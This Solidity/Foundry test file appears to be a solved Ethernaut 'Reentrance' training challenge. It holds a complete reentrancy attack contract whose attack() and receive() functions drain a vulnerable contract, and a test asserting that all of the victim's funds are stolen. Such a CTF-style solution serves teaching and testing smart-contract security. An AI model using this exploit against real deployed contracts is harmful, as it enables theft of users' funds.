// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

// Reentrance.sol is Solidity ^0.6, so use an interface + deployCode.
interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

/// @dev Classic reentrancy: withdraw sends ETH before updating balances.
contract AttackReentrance {
    IReentrance public immutable target;

    constructor(IReentrance _target) {
        target = _target;
    }

    // Kick off the steal (donate if needed, then withdraw).
    function attack() external payable {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Hints:
        //   1. You need a balance in the victim (donate to yourself / this contract)
        //   2. Call withdraw with that amount
        //   3. In receive()/fallback, call withdraw again while balances are not yet updated
        // ========== END ATTACK LOGIC ==========
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    // Called when Reentrance sends you ETH inside withdraw().
    receive() external payable {
        // ========== YOUR REENTRANCY LOGIC HERE ==========
        // Tip: if target still has ETH and you still have credit, withdraw again.
        // ========== END REENTRANCY LOGIC ==========
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}

contract ReentranceTest is Test {
    IReentrance public target;
    AttackReentrance public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy victim and seed it with some ETH (like the Ethernaut instance).
        vm.deal(deployer, 10 ether);
        vm.startPrank(deployer);
        target = IReentrance(deployCode("src/Reentrance.sol:Reentrance"));
        target.donate{value: 10 ether}(deployer);
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackReentrance(target);
        vm.stopPrank();

        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        // Win condition:
        //   steal all ETH from Reentrance → address(target).balance == 0
        //
        // Hints (look at Reentrance.sol carefully):
        //   - withdraw() does call{value:} BEFORE balances[msg.sender] -= _amount
        //   - Your contract's receive() can call withdraw() again (reentrancy)
        //   - Donate a small amount first so balances[attackContract] > 0
        //
        // Tip:
        //   attackContract.attack{value: 1 ether}();

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        attackContract.attack{value: 1 ether}();
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(address(target).balance, 0, "all funds should be stolen");
    }
}
